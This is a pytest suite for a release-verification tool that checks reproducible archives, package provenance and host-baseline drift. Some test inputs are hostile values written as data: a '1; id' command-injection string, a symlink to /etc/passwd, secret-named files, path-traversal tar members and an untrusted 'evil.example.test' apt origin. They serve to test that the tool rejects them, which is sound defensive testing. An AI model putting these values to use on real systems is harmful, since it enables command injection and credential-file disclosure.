    for key, bad in (("RELEASE_REV", "abc"), ("ARCHIVE_SHA256", "G" * 64), ("BASELINE_SHA256", "UNSET"), ("BASELINE_SHA256", "a" * 63), ("REFERENCE_SHA256", "UNSET"), ("REFERENCE_SHA256", "9" * 63), ("APT_BASE", "UNSET"), ("APT_BASE", ""),
                     ("APT_BASE", "libc6=1 libc6=2"), ("APT_BASE", "python3.14=1"), ("APT_BASE", "libc6"), ("APT_PACKAGES", "python3.14=1 python3.14-venv=1"),
                     ("APT_ORIGIN", "resolute-updates"), ("PY_SHA256", "UNSET")):
        assert not shell_accepts({**good, key: bad}), ("shell", key, bad)
        assert rr.validate_fields({**good, key: bad}), ("tool", key, bad)


def test_the_archive_name_policy_is_the_one_in_block_d():
    definitions = next(b for b in runbook_blocks() if b.startswith("ROUTE3_PATH="))
    stage = re.search(r"^ROUTE3_STAGE_ENTRY='(.*?)'$", definitions, re.S | re.M)[1]
    shell_bad = re.search(r'^BAD=re\.compile\(r"(.*?)",re\.I\)$', stage, re.M)[1]
    assert shell_bad == rr.BAD_MEMBER_NAME


# ---- archive, manifest, published revision, SA-2 tree ----------------------------------------------------------------------------------

def git(repo: Path, *args: str) -> str:
    env = {"PATH": "/usr/bin:/bin", "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_SYSTEM": "/dev/null", "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.test",
           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.test", "GIT_AUTHOR_DATE": "2026-01-01T00:00:00Z", "GIT_COMMITTER_DATE": "2026-01-01T00:00:00Z"}
    return subprocess.run(["/usr/bin/git", "-C", str(repo), *args], capture_output=True, text=True, check=True, env=env).stdout.strip()


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "repo"
    r.mkdir()
    git(r, "init", "-q", "-b", "main")
    files = {"adapters/__init__.py": "", "application/use.py": "x = 1\n", "tools/polkit_tmpfiles.py": "print('t')\n", "infra/executor/unit.service": "[Service]\n",
             "infra/tmpfiles.d/f.conf": "d /run/x 0755 root root -\n", "infra/rp11-h1/build.py": "pass\n", "docs/other.md": "outside the pathspec\n", "README.md": "top\n"}
    for name, content in files.items():
        (r / name).parent.mkdir(parents=True, exist_ok=True)
        (r / name).write_text(content)
    git(r, "add", "-A")
    git(r, "commit", "-q", "-m", "release candidate")
    git(r, "branch", "published")
    return r


def release_fixture(repo: Path, tmp_path: Path, sa2: bool = False):
    rev = git(repo, "rev-parse", "HEAD")
    out = tmp_path / "artifacts"
    archive, manifest = rr.build_archive(repo, rev, out)
    (out / "wheelhouse").mkdir()
    wheel = out / "wheelhouse" / rr.WHEEL_NAME
    wheel.write_bytes(b"not the wheel")
    fields = {**GOOD, "RELEASE_REV": rev, "ARCHIVE_SHA256": archive, "MANIFEST_SHA256": manifest, "APT_PACKAGES": "python3.14=1 python3.14-minimal=1 python3.14-venv=1", "APT_BASE": "libc6=1"}
    return rev, out, fields, wheel


def test_the_archive_and_manifest_are_reproducible_and_equal_the_runbook_recipes(repo, tmp_path):
    rev = git(repo, "rev-parse", "HEAD")
    first, second = tmp_path / "a", tmp_path / "b"
    assert rr.build_archive(repo, rev, first) == rr.build_archive(repo, rev, second)
    tar = (first / "code.tar").read_bytes()
    assert tar == subprocess.run(["/usr/bin/git", "-C", str(repo), "archive", "--format=tar", rev, "--", *rr.ARCHIVE_PATHSPEC], capture_output=True, check=True,
                                 env={"PATH": "/usr/bin:/bin", "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_SYSTEM": "/dev/null"}).stdout, "P.3's literal git archive command"
    extracted = tmp_path / "extracted"
    extracted.mkdir()
    subprocess.run(["tar", "-xf", str(first / "code.tar"), "-C", str(extracted)], check=True)
    recipe = subprocess.run("find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum | sed 's#  ./#  #'", shell=True, cwd=extracted, capture_output=True, text=True, check=True,
                            env={"PATH": "/usr/bin:/bin"}).stdout
    assert (first / "MANIFEST.sha256").read_text() == recipe, "P.3's literal manifest recipe"
    assert "docs/other.md" not in recipe and "README.md" not in recipe, "only the pathspec ships"
    with pytest.raises(rr.RecordError, match="already exists"):
        rr.build_archive(repo, rev, first)


@pytest.mark.parametrize("rev", ["HEAD", "abc", "0" * 40, "g" * 40])
def test_only_a_full_existing_commit_id_builds_an_archive(repo, tmp_path, rev):
    with pytest.raises(rr.RecordError):
        rr.build_archive(repo, rev, tmp_path / "o")


def test_a_published_clean_release_verifies_and_each_deviation_is_a_finding(repo, tmp_path):
    rev, out, fields, wheel = release_fixture(repo, tmp_path)
    wheel.write_bytes(b"wheel")   # a stand-in whose digest the fixture does not match: the real pin is a fixed field
    findings = rr.verify_release(repo, fields, out, "published")
    assert findings == [f"{wheel} is missing or differs from the pinned wheel digest"], "everything but the (fixed-digest) wheel is satisfied"
    # unpublished revision
    git(repo, "checkout", "-q", "-b", "work")
    (repo / "application/use.py").write_text("x = 2\n")
    git(repo, "commit", "-qam", "unpublished change")
    new = git(repo, "rev-parse", "HEAD")
    f2 = rr.verify_release(repo, {**fields, "RELEASE_REV": new}, out, "published")
    assert any("is not published" in f for f in f2) and any("ROUTE3_ARCHIVE_SHA256 does not equal" in f for f in f2)
    # a published revision whose tree later changed inside the pathspec, and an untracked file there
    git(repo, "checkout", "-q", "main")
    (repo / "application/use.py").write_text("x = 3\n")
    assert any("working tree differs from the release revision" in f for f in rr.verify_release(repo, fields, out, "published"))
    git(repo, "checkout", "--", "application/use.py")
    (repo / "tools/stray.py").write_text("print()\n")
    assert any("uncommitted or untracked" in f for f in rr.verify_release(repo, fields, out, "published"))
    (repo / "tools/stray.py").unlink()
    # a change outside the pathspec (docs, the release record itself) is not a deployable change
    (repo / "docs/other.md").write_text("edited\n")
    assert not any("working tree differs" in f or "untracked" in f for f in rr.verify_release(repo, fields, out, "published"))
    # a tampered or substituted artifact, and a wrong field
    (out / "code.tar").write_bytes(b"tampered")
    assert any("not byte-identical" in f for f in rr.verify_release(repo, fields, out, "published"))
    assert any("ROUTE3_MANIFEST_SHA256 does not equal" in f for f in rr.verify_release(repo, {**fields, "MANIFEST_SHA256": "0" * 64}, out, "published"))
    assert rr.verify_release(repo, fields, out, "no-such-ref") == ["the published reference no-such-ref does not exist"]


UNREVIEWABLE = {
    "symlink": lambda r: (r / "tools/link").symlink_to("/etc/passwd"),
    "secret-named data": lambda r: (r / "infra/executor/credentials.json").write_text("{}"),
    "environment file": lambda r: (r / "tools/.env").write_text("x=1\n"),
    "bytecode": lambda r: (r / "tools/x.pyc").write_bytes(b"x"),
    "odd name": lambda r: (r / "tools/a b.py").write_text(""),
}


@pytest.mark.parametrize("label", sorted(UNREVIEWABLE))
def test_unreviewable_archive_content_is_refused(repo, label):
    UNREVIEWABLE[label](repo)
    git(repo, "add", "-A", "-f")
    git(repo, "commit", "-qm", label)
    with pytest.raises(rr.RecordError):
        rr.archive_files(rr.git_archive(repo, git(repo, "rev-parse", "HEAD")))


def test_an_executable_script_is_ordinary_archive_content(repo):
    (repo / "tools/run.sh").write_text("#!/bin/sh\n")
    (repo / "tools/run.sh").chmod(0o755)
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "script")
    assert "tools/run.sh" in rr.archive_files(rr.git_archive(repo, git(repo, "rev-parse", "HEAD")))


def test_the_archive_checks_refuse_special_members_duplicates_and_oversize():
    def build(*members):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:") as t:
            for info, data in members:
                t.addfile(info, io.BytesIO(data) if data is not None else None)
        return buf.getvalue()

    def reg(name, data=b"x", mode=0o644):
        i = tarfile.TarInfo(name); i.size = len(data); i.mode = mode
        return i, data
    assert rr.archive_files(build(reg("tools/a.py")))
    for label, members in (("setuid", [reg("tools/a.py", mode=0o4755)]), ("duplicate", [reg("tools/a.py"), reg("tools/a.py")]), ("absolute", [reg("/etc/x")]),
                           ("parent", [reg("tools/../x")]), ("empty", []), ("big", [reg("tools/big", b"0" * ((8 << 20) + 1))])):
        with pytest.raises(rr.RecordError):
            rr.archive_files(build(*members))
    fifo = tarfile.TarInfo("tools/f"); fifo.type = tarfile.FIFOTYPE
    with pytest.raises(rr.RecordError):
        rr.archive_files(build((fifo, None)))
    hard = tarfile.TarInfo("tools/h"); hard.type = tarfile.LNKTYPE; hard.linkname = "tools/a.py"
    with pytest.raises(rr.RecordError):
        rr.archive_files(build(reg("tools/a.py"), (hard, None)))


def test_the_sa2_tree_digest_is_the_s3_2_identity_and_refuses_unsafe_trees(tmp_path):
    tree = tmp_path / "sa2"
    (tree / "lib").mkdir(parents=True)
    (tree / "rp11_h1.py").write_text("sa2\n")
    (tree / "lib/rp11_roles.py").write_text("roles\n")
    for p in [tree, tree / "lib"]:
        p.chmod(0o755)
    for p in tree.rglob("*.py"):
        p.chmod(0o644)
    recipe = subprocess.run("find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum | sha256sum | cut -d' ' -f1", shell=True, cwd=tree, capture_output=True, text=True, check=True,
                            env={"PATH": "/usr/bin:/bin"}).stdout.strip()
    assert rr.sa2_tree_digest(tree) == recipe
    cli = subprocess.run([PYTHON, "-I", "-S", "-B", str(TOOL), "sa2-digest", str(tree)], capture_output=True, text=True, check=False, env={"PATH": "/usr/bin:/bin"})
    assert cli.returncode == 0 and cli.stdout.strip() == recipe
    (tree / "lib/rp11_roles.py").write_text("changed\n")
    assert rr.sa2_tree_digest(tree) != recipe
    for label, setup in (("link", lambda: (tree / "ln").symlink_to("rp11_h1.py")), ("writable", lambda: (tree / "rp11_h1.py").chmod(0o666)),
                         ("odd name", lambda: (tree / "a\\b").write_text("")), ("fifo", lambda: os.mkfifo(tree / "fifo"))):
        setup()
        with pytest.raises(rr.RecordError):
            rr.sa2_tree_digest(tree)
        for p in tree.iterdir():
            if p.name in ("ln", "a\\b", "fifo"):
                p.unlink()
        (tree / "rp11_h1.py").chmod(0o644)
    empty = tmp_path / "empty"
    empty.mkdir()
    with pytest.raises(rr.RecordError):
        rr.sa2_tree_digest(empty)


def build_interpreter_deb(tmp_path: Path) -> Path:
    """A real ``python3.14-minimal`` package file whose interpreter is a known byte string, built with dpkg-deb."""
    payload = tmp_path / "payload" / "usr/bin"
    payload.mkdir(parents=True)
    (payload / "python3.14").write_bytes(b"\x7fELF packaged interpreter\n")
    control = tmp_path / "payload/DEBIAN"
    control.mkdir()
    control.chmod(0o755)
    (control / "control").write_text("Package: python3.14-minimal\nVersion: 1\nArchitecture: amd64\nMaintainer: t <t@example.test>\nDescription: t\n")
    deb = tmp_path / "python3.14-minimal_1_amd64.deb"
    subprocess.run(["dpkg-deb", "--build", "--root-owner-group", str(tmp_path / "payload"), str(deb)], check=True, capture_output=True)
    return deb


def test_the_interpreter_reference_requires_the_signed_index_digest_to_match_the_download(tmp_path):
    deb = build_interpreter_deb(tmp_path)
    want = hashlib.sha256(deb.read_bytes()).hexdigest()

    def runner(index_digest):
        def run(argv, cwd):
            if argv[1] == "show":
                return 0, f"Package: python3.14-minimal\nSHA256: {index_digest}\n"
            shutil.copy(deb, cwd / deb.name)
            return 0, ""
        return run
    digest = rr.reference_interpreter("1", tmp_path / "w1", runner(want))
    assert digest == hashlib.sha256(b"\x7fELF packaged interpreter\n").hexdigest()
    with pytest.raises(rr.RecordError, match="differs from the SHA-256"):
        rr.reference_interpreter("1", tmp_path / "w2", runner("0" * 64))
    (tmp_path / "w3").mkdir()
    (tmp_path / "w3/x").write_text("")
    with pytest.raises(rr.RecordError, match="not empty"):
        rr.reference_interpreter("1", tmp_path / "w3", runner(want))
    with pytest.raises(rr.RecordError):
        rr.reference_interpreter("1; id", tmp_path / "w4", runner(want))


# ---- the real disposable host --------------------------------------------------------------------------------------------------------

ORACLE = os.uname().nodename == "Test" and Path(rr.INTERPRETER).exists()


@pytest.mark.skipif(not ORACLE, reason="inspects the real installed Python 3.14 closure and downloads its packages from the real archive; runs only on the disposable host (nodename Test)")
def test_the_real_installed_closure_attests_and_equals_the_real_signed_archive_packages_and_rejects_a_tampered_record(tmp_path):
    def tool(*args):
        return subprocess.run([PYTHON, "-I", "-S", "-B", str(TOOL), *args], capture_output=True, text=True, check=False, env={"PATH": "/usr/bin:/bin"})
    done = tool("attest-host")
    assert done.returncode == 0, done.stdout + done.stderr
    record = tmp_path / "baseline.record"
    record.write_text(done.stdout)
    parsed = rr.Baseline.parse(done.stdout)
    assert {"python3.14", "python3.14-minimal", "python3.14-venv"} <= {m.name for m in parsed.of("pin")}
    assert parsed.interpreter_sha256 == rr.sha256_file(Path(os.path.realpath(rr.INTERPRETER)))
    # the reference comes from the REAL signed archive (apt-cache show / apt-get download), never from the installed system
    made = tool("reference-payload", "--record", str(record), "--workdir", str(tmp_path / "debs"))
    assert made.returncode == 0, made.stdout + made.stderr
    reference = tmp_path / "reference.record"
    reference.write_text(made.stdout)
    again = tool("verify-host", "--record", str(record), "--reference", str(reference))
    assert again.returncode == 0, again.stdout + again.stderr
    first_pin = next(m for m in parsed.members if m.cls == "pin")
    record.write_text(done.stdout.replace(f"\t{first_pin.name}\t{first_pin.version}\t", f"\t{first_pin.name}\t{first_pin.version}x\t", 1))
    bad = tool("verify-host", "--record", str(record), "--reference", str(reference))
    assert bad.returncode == 1 and "NO-GO" in bad.stdout
    record.write_text(done.stdout)
    tampered = made.stdout.replace(made.stdout.splitlines()[3].split("\t")[5], "0" * 64, 1)
    reference.write_text(tampered)
    assert tool("verify-host", "--record", str(record), "--reference", str(reference)).returncode == 1, "a reference with a different metadata digest is refused"


WHEEL_SRC = Path(os.environ.get("FREEDOM_JEEPNEY_WHEEL", "/home/ubuntu/jeepney-0.9.0-py3-none-any.whl"))


@pytest.mark.skipif(not (ORACLE and WHEEL_SRC.exists() and rr.sha256_file(WHEEL_SRC) == rr.WHEEL_SHA256), reason="needs the disposable host, /usr/bin/python3.14 and the pinned wheel")
def test_the_sa2_reference_build_is_reproducible_and_matches_a_third_build(tmp_path):
    out = tmp_path / "a"
    archive, _ = rr.build_archive(REPO, subprocess.run(["git", "-C", str(REPO), "rev-parse", "HEAD"], capture_output=True, text=True, check=True).stdout.strip(), out)
    digest = rr.sa2_reference(out / "code.tar", WHEEL_SRC)
    assert re.fullmatch(r"[0-9a-f]{64}", digest) and rr.sa2_reference(out / "code.tar", WHEEL_SRC) == digest


# ---- the runbook blocks that use the tool (S0.A, S0.3) and the shell helpers (route3_base_ok) ------------------------------------------------

def definitions(host: SyntheticHost, art: Path | None = None) -> str:
    text = next(b for b in runbook_blocks() if b.startswith("ROUTE3_PATH="))
    text = text.replace("ROUTE3_PATH=/usr/sbin:/usr/bin:/sbin:/bin", f"ROUTE3_PATH={host.bin}:/usr/sbin:/usr/bin:/sbin:/bin")
    text = text.replace("ROUTE3_PY=/usr/bin/python3.14", f"ROUTE3_PY={sys.executable}")
    if art is not None:
        text = text.replace("ROUTE3_ART=/root/route3-artifacts", f"ROUTE3_ART={art}")
    return text.replace('stat -c %u "$d")" = 0 ]', 'stat -c %u "$d")" = "$(id -u)" ]').replace('stat -c %u:%h "$f")" = 0:1 ]', 'stat -c %u:%h "$f")" = "$(id -u):1" ]')   # the one test seam: root ownership


def run_block(host: SyntheticHost, ident: str, fields: dict[str, str] | None = None, art: Path | None = None, mutate=None, env: dict[str, str] | None = None) -> subprocess.CompletedProcess:
    body = next(b for b in runbook_blocks() if b.startswith(f"# {ident} — AUTHORITY"))
    body = body.replace('stat -c %u "$d")" = 0 ]', 'stat -c %u "$d")" = "$(id -u)" ]').replace('stat -c %u:%h "$f")" = 0:1 ]', 'stat -c %u:%h "$f")" = "$(id -u):1" ]')   # the one test seam: root ownership
    defs = definitions(host, art)
    if mutate:
        body, defs = mutate(body), mutate(defs)    # the host flags also apply to the tool call inside the gate (block D)
    assigns = "".join(f'ROUTE3_{k}="{v}"\n' for k, v in (fields or {}).items())
    return subprocess.run(["/bin/bash", "-c", defs + "\n" + assigns + body + "\n"], capture_output=True, text=True, check=False, env={"PATH": "/usr/bin:/bin", **(env or {})})


def s03_world(host: SyntheticHost, tmp_path: Path):
    host.set_interpreter(Path(os.path.realpath(sys.executable)).read_bytes())   # route3_python_ok hashes the real ROUTE3_PY, which the record AND the archive's package must then carry
    fields, record_text = bound_fields(host)
    art = tmp_path / "art"
    rev_dir = art / fields["RELEASE_REV"]
    rev_dir.mkdir(parents=True)
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:") as tar:
        info = tarfile.TarInfo("tools/route3_release_record.py")
        data = TOOL.read_bytes()
        info.size, info.mode = len(data), 0o644
        tar.addfile(info, io.BytesIO(data))
    (rev_dir / "code.tar").write_bytes(buf.getvalue())
    (rev_dir / "baseline.record").write_text(record_text)
    (rev_dir / "reference.record").write_text(host.last_reference)
    fields["ARCHIVE_SHA256"] = rr.sha256_bytes(buf.getvalue())
    for p in (art, rev_dir):
        p.chmod(0o755)
    for p in rev_dir.iterdir():
        p.chmod(0o644)
    return fields, art, rev_dir


def host_flags(host: SyntheticHost):
    flags = " ".join(host.flags())
    return lambda body: body.replace("verify-host --record", f"verify-host {flags} --record").replace("attest-host", f"attest-host {flags}")


def test_s0_3_passes_on_the_reviewed_baseline_and_runs_the_tool_from_the_verified_archive(host, tmp_path):
    fields, art, _ = s03_world(host, tmp_path)
    done = run_block(host, "S0.3", fields, art, host_flags(host))
    assert done.returncode == 0 and "[S0.3 rc=0]" in done.stdout and "ok: the host still is the reviewed baseline" in done.stdout, (done.stdout, done.stderr)
    # the tool that ran is the one INSIDE code.tar, not a checkout: a different tool in the archive decides the outcome
    other = tmp_path / "other"
    other.mkdir()
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:") as tar:
        stub = b"import sys\nprint('stub tool ran', sys.argv[1:2])\nsys.exit(0)\n"
        info = tarfile.TarInfo("tools/route3_release_record.py"); info.size = len(stub)
        tar.addfile(info, io.BytesIO(stub))
    (art / fields["RELEASE_REV"] / "code.tar").write_bytes(buf.getvalue())
    done = run_block(host, "S0.3", {**fields, "ARCHIVE_SHA256": rr.sha256_bytes(buf.getvalue())}, art, host_flags(host))
    assert "stub tool ran" in done.stdout, done.stdout


@pytest.mark.parametrize("label", ["base library update", "pinned update", "new origin", "interpreter replaced", "changed packaged file", "root package removed", "dependency added", "installed library payload", "installed maintainer script",
                                   "missing origin"])
def test_s0_3_refuses_every_drift_from_the_reviewed_baseline_and_changes_nothing(host, tmp_path, label):
    fields, art, rev_dir = s03_world(host, tmp_path)
    if label == "base library update":
        host.status({"libffi8": ("3.5.3-1", "amd64", "libffi", "libc6", "")}); host.offer("libffi8", "3.5.3-1", MIRROR)
    elif label == "pinned update":
        host.status({"python3.14": ("3.14.4-1ubuntu0.3", "amd64", "python3.14", PACKAGES["python3.14"][3], "")}); host.offer("python3.14", "3.14.4-1ubuntu0.3", MIRROR)
    elif label == "new origin":
        host.offer("python3.14", VERSION, "http://ppa.example.test/ubuntu x/main", append=True)
    elif label == "interpreter replaced":
        host.interpreter.write_bytes(b"other interpreter")
    elif label == "changed packaged file":
        (host.data / "verify" / "python3.14-minimal").write_text("??5??????   /usr/bin/python3.14\n")
    elif label == "root package removed":
        host.status({"python3.14-venv": (None, "", "", "", "")})
    elif label == "dependency added":
        host.status({"libffi8": ("3.5.2-1", "amd64", "libffi", "libc6, libnew1", ""), "libnew1": ("1", "amd64", "new", "", "")}); host.offer("libnew1", "1", MIRROR)
    elif label == "installed library payload":    # the archive still offers exactly this name and version; dpkg --verify (local metadata) is clean
        mutate_library(host)
    elif label == "installed maintainer script":
        mutate_script(host)
    elif label == "missing origin":               # the host no longer has the reviewed second source for a member: a missing origin is drift, never accepted
        host.offer("python3.14-minimal", VERSION, SECURITY)
    before = {str(p.relative_to(tmp_path)): p.read_bytes() for p in tmp_path.rglob("*") if p.is_file() and p.name not in ("python3.14",) and "usr-bin" not in p.name}
    done = run_block(host, "S0.3", fields, art, host_flags(host))
    assert done.returncode != 0 and "NO-GO" in done.stdout and f"[S0.3 rc={done.returncode}]" in done.stdout and "nothing was changed" in done.stdout, (label, done.stdout, done.stderr)
    after = {str(p.relative_to(tmp_path)): p.read_bytes() for p in tmp_path.rglob("*") if p.is_file() and p.name not in ("python3.14",) and "usr-bin" not in p.name}
    assert {k: v for k, v in after.items() if not k.startswith("dpkg/") and not k.startswith("data/")} == {k: v for k, v in before.items() if not k.startswith("dpkg/") and not k.startswith("data/")}


@pytest.mark.parametrize("label", ["record tampered", "archive tampered", "base field short", "pinned field changed", "origin field wider", "interpreter field wrong", "baseline field wrong", "unset field",
                                   "artifact directory writable", "record is a link", "reference tampered", "reference missing", "reference field wrong", "reference for another record",
                                   "reference is a link", "reference field unset"])
def test_s0_3_refuses_artifacts_and_fields_that_do_not_belong_to_the_record(host, tmp_path, label):
    fields, art, rev_dir = s03_world(host, tmp_path)
    if label == "record tampered":
        (rev_dir / "baseline.record").write_text((rev_dir / "baseline.record").read_text().replace("resolute", "resolut3", 1))
    elif label == "archive tampered":
        (rev_dir / "code.tar").write_bytes(b"tampered")
    elif label == "base field short":
        fields["APT_BASE"] = " ".join(fields["APT_BASE"].split()[:-1])
    elif label == "pinned field changed":
        fields["APT_PACKAGES"] = fields["APT_PACKAGES"].replace(VERSION, "3.14.4-1ubuntu0.9", 1)
    elif label == "origin field wider":
        fields["APT_ORIGIN"] = f"{MIRROR}, {SECURITY}"
    elif label == "interpreter field wrong":
        fields["PY_SHA256"] = "9" * 64
    elif label == "baseline field wrong":
        fields["BASELINE_SHA256"] = "9" * 64
    elif label == "unset field":
        fields["BASELINE_SHA256"] = "UNSET"
    elif label == "artifact directory writable":
        rev_dir.chmod(0o775)
    elif label == "record is a link":
        (rev_dir / "baseline.record").rename(rev_dir / "real.record")
        (rev_dir / "baseline.record").symlink_to("real.record")
    elif label == "reference tampered":
        (rev_dir / "reference.record").write_text((rev_dir / "reference.record").read_text().replace("pkg\t", "pkg\t", 1) + "x")
    elif label == "reference missing":
        (rev_dir / "reference.record").unlink()
    elif label == "reference field wrong":
        fields["REFERENCE_SHA256"] = "9" * 64
    elif label == "reference field unset":
        fields["REFERENCE_SHA256"] = "UNSET"
    elif label == "reference is a link":
        (rev_dir / "reference.record").rename(rev_dir / "real.reference")
        (rev_dir / "reference.record").symlink_to("real.reference")
    elif label == "reference for another record":    # a perfectly canonical reference, derived and hashed for a DIFFERENT baseline record
        other = rr.Baseline.parse(host.reference()[0].replace("resolute-updates", "resolute-security"))
        text = other.render()
        forged = rr.build_reference(other, text, tmp_path / "forged", host.archive(origins=("http://archive.example.test/ubuntu resolute-security/main",))).render()
        (rev_dir / "reference.record").write_text(forged)
        fields["REFERENCE_SHA256"] = rr.sha256_bytes(forged.encode())
    done = run_block(host, "S0.3", fields, art, host_flags(host))
    assert done.returncode != 0 and "NO-GO" in done.stdout, (label, done.stdout, done.stderr)


@pytest.mark.skipif(os.geteuid() == 0, reason="S0.A refuses root; the unprivileged path is exercised as a normal user")
def test_s0_a_attests_unprivileged_and_prints_the_tool_digest_first(host):
    done = run_block(host, "S0.A", {}, None, host_flags(host), env={"ROUTE3_TOOL": str(TOOL)})
    assert done.returncode == 0 and "[S0.A rc=0]" in done.stdout, (done.stdout, done.stderr)
    assert done.stdout.startswith(rr.RECORD_HEADER) and rr.Baseline.parse(done.stdout.split("[S0.A")[0]) == rr.attest(host.host())
    assert done.stderr.split()[0] == rr.sha256_file(TOOL) and str(TOOL) in done.stderr


def test_s0_a_refuses_root_a_missing_tool_and_a_linked_tool(host, tmp_path):
    link = tmp_path / "tool-link.py"
    link.symlink_to(TOOL)
    for env in ({}, {"ROUTE3_TOOL": str(tmp_path / "missing.py")}, {"ROUTE3_TOOL": str(link)}):
        done = run_block(host, "S0.A", {}, None, host_flags(host), env=env)
        assert done.returncode == 2 and "NO-GO" in done.stdout and "[S0.A rc=2]" in done.stdout and "BASELINE" not in done.stdout, (env, done.stdout, done.stderr)


def test_the_shell_base_check_accepts_the_attested_set_and_names_each_deviation(host):
    fields, _ = bound_fields(host)
    base = fields["APT_BASE"]
    prelude = f'ROUTE3_APT_BASE="{base}"; ROUTE3_APT_ORIGIN="{fields["APT_ORIGIN"]}"; '

    def check(setup=None, apt_base=None):
        if setup:
            setup()
        text = prelude.replace(f'ROUTE3_APT_BASE="{base}"', f'ROUTE3_APT_BASE="{apt_base or base}"')
        return subprocess.run(["/bin/bash", "-c", definitions(host) + "\n" + text + 'export PATH="$ROUTE3_PATH"; route3_base_ok; echo "rc=$?"'], capture_output=True, text=True, check=False, env={"PATH": "/usr/bin:/bin"})
    assert "rc=0" in check().stdout
    host.offer("libffi8", "3.5.2-1", rr.DPKG_STATUS_PSEUDO_SOURCE, MIRROR)   # the installed-state marker is not an origin
    assert "rc=0" in check().stdout and "not listed" not in check().stdout
    out = check(apt_base=base.replace("libffi8=3.5.2-1", "libffi8=3.5.9-1")).stdout
    assert "rc=1" in out and "base package libffi8 is at 3.5.2-1, not the attested 3.5.9-1" in out
    out = check(apt_base=base + " absent-pkg=1").stdout
    assert "rc=1" in out and "absent-pkg is at <absent>" in out
    host.offer("libffi8", "3.5.2-1", "http://evil.example.test/ubuntu other/main", append=True)
    out = check().stdout
    assert "rc=1" in out and "also offered by an origin that is not listed: http://evil.example.test/ubuntu other/main" in out


# ---- the signed-archive payload reference (finding 1) --------------------------------------------------------------------------------------

def reviewed_reference(host) -> tuple[rr.Baseline, str, rr.Reference]:
    text, reference_text = host.reference()
    return rr.Baseline.parse(text), text, rr.Reference.parse(reference_text)


def payload_drift(host, reference: rr.Reference) -> list[str]:
    return rr.payload_findings(host.host(), rr.attest(host.host()), reference)


@pytest.mark.parametrize("compression", ["xz", "gz", "none"])
def test_a_package_file_and_the_installed_package_have_the_same_identity(host, compression):
    """The reader of a .deb and the reader of the installed state arrive at the same two digests, for every compression the archive may use."""
    for name, spec in host.specs.items():
        package = next(p for p in rr.parse_status(host.host().status_text()) if p.name == name)
        fields = next(f for f in rr._paragraphs(host.host().status_text()) if f.get("Package") == name)
        assert rr.deb_identity(rr.parse_deb(make_deb(spec, compression))) == rr.installed_identity(host.host(), package, fields), name


def test_the_unmodified_host_equals_its_signed_archive_reference(host):
    record, _, reference = reviewed_reference(host)
    assert payload_drift(host, reference) == [] and {m.name for m in reference.members} == {m.name for m in record.members}
    assert all(m.files > 0 and m.deb_sha256 == hashlib.sha256(make_deb(host.specs[m.name], "none")).hexdigest() for m in reference.members), "each member carries the signed-index digest of its package file"


# ---- architecture variants: the installed build is the reviewed build, never "plain amd64" by assumption ------------------------------------
# On oracle-test (2026-11-13, dpkg-query/apt-cache): libc6 and python3.14-minimal are installed as Architecture amd64, Architecture-Variant amd64v3, with Filename ..._amd64v3.deb.

def by_name(reference: rr.Reference) -> dict[str, rr.RefMember]:
    return {m.name: m for m in reference.members}


def test_a_baseline_host_running_amd64v3_builds_attests_and_equals_the_reference_of_those_builds(host, tmp_path):
    plain = host.archive()
    for name in ("libc6", "python3.14-minimal"):
        host.make_variant(name)
    variant = host.archive()
    record = rr.attest(host.host())
    text = record.render()
    assert {m.name: m.arch for m in record.members}["libc6"] == "amd64" and "amd64v3" not in text, "dpkg's architecture is plain amd64: the baseline record format needs no variant column"
    reference = rr.build_reference(rr.Baseline.parse(text), text, tmp_path / "variant", variant)
    assert payload_drift(host, reference) == [], "the reference generated from the variant builds equals the host that runs them"
    assert rr.reference_findings(reference, record, text) == []
    wrong = rr.build_reference(rr.Baseline.parse(text), text, tmp_path / "plain", plain)
    for name in ("libc6", "python3.14-minimal"):
        assert by_name(reference)[name].deb_sha256 != by_name(wrong)[name].deb_sha256, "another package file"
        assert by_name(reference)[name].meta_sha256 != by_name(wrong)[name].meta_sha256, "the variant label is bound in the metadata digest"
    assert by_name(reference)["libc6"].payload_sha256 != by_name(wrong)["libc6"].payload_sha256, "and the bytes differ"
    assert by_name(reference)["zlib1g"] == by_name(wrong)["zlib1g"], "a plain package of the same closure is untouched"
    assert "f\tArchitecture-Variant\tamd64v3" in rr.deb_rows(rr.parse_deb(variant.debs["libc6"]))[0]
    assert not any("Architecture-Variant" in row for row in rr.deb_rows(rr.parse_deb(plain.debs["libc6"]))[0]), "no row for a plain build: its digests are those of every earlier reference"


def test_the_payload_rows_of_the_installed_variant_and_of_its_package_file_agree_and_show_the_label(host, tmp_path):
    host.make_variant("libc6")
    deb = tmp_path / "libc6.deb"
    deb.write_bytes(make_deb(host.specs["libc6"]))
    from_deb = host.cli("payload-rows", "--package", "libc6", "--deb", str(deb), *host.flags())
    installed = host.cli("payload-rows", "--package", "libc6", *host.flags())
    assert from_deb.returncode == 0 and from_deb.stdout == installed.stdout
    assert "Architecture-Variant\tamd64v3" in installed.stdout, "the diagnostic shows which build a host runs, so the reference can be generated for the same one"


@pytest.mark.parametrize("installed_is_variant", [True, False], ids=["installed-variant-vs-plain-reference", "installed-plain-vs-variant-reference"])
def test_a_reference_of_the_other_build_is_a_safe_mismatch_in_both_directions(host, tmp_path, installed_is_variant):
    plain = host.archive()
    other = SyntheticHost(tmp_path / "other")
    other.make_variant("libc6")
    variant = other.archive()
    if installed_is_variant:
        host.make_variant("libc6")
    record = rr.attest(host.host())
    text = record.render()
    reference = rr.build_reference(rr.Baseline.parse(text), text, tmp_path / "wrong", plain if installed_is_variant else variant)
    findings = payload_drift(host, reference)
    assert any("package metadata of libc6=" in f for f in findings) and any("installed files of libc6=" in f for f in findings)
    assert all("libc6=" in f for f in findings), "nothing else of the closure is disturbed"
    record_file, wrong_file, right_file = tmp_path / "baseline.record", tmp_path / "wrong.reference", tmp_path / "right.reference"
    record_file.write_text(text)
    wrong_file.write_text(reference.render())
